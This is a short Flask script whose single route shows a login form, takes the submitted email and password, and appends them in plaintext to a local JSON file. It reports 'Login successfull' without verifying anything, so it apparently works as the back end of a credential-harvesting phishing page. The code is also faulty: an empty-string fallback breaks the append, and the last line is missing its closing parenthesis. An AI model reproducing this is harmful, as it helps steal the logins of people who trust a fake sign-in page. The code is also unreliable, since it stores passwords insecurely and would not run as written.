from flask import *
import json

app = Flask(__name__)

def read_file():
    try:
        with open("store_p_e.py", "r")as read_only:
            return json.load(read_only)
    except FileNotFoundError:
         return ""

def store_info_here(collect_info):
    with open("store_p_e.py", "w")as paste_info:
        json.dump(collect_info, paste_info, indent=4)

@app.route("/", methods=['GET', 'POST'])
def hello():
    hold = read_file()
    if request.method == "POST":
        email = request.form['Email']
        pass_word = request.form['Password']
        storing = {
        "User_Email": email,
        "User_Password": pass_word,
        }
        hold.append(storing)
        store_info_here(hold)
        return "Login successfull"

    return render_template("html.html")

if __name__ == "__main__":
    app.run(debug=True
